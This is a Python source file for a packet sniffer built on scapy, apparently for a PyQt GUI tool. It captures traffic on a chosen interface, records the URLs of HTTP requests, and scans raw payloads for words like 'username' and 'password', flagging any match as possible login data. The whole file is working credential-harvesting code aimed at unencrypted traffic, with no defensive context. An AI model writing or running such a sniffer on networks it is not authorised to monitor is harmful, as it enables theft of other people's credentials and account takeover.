import scapy.all as scapy
from scapy.layers import http

from PyQt5.QtCore import QMutex


class Sniffer:
    def __init__(self, interface, output):
        self.interface = interface
        self.output = output

    def sniff(self):
        scapy.sniff(iface=self.interface, store=False, prn=self.process_sniffed_packet)

    def get_login_info(self, packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for i in keywords:
                if bytes(i, encoding='utf8') in load:
                    return load

    def get_url(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def process_sniffed_packet(self, packet):
        try:
            if packet.haslayer(http.HTTPRequest):
                url = self.get_url(packet)
                self.output.append("[+] HTTP Request >>>" + url.decode("utf-8"))
            login_info = self.get_login_info(packet)
            if login_info:
                self.output.append("\n\n[+] Possible username/password >>> " + login_info.decode("utf-8") + "\n\n")
        except UnicodeDecodeError:
            pass
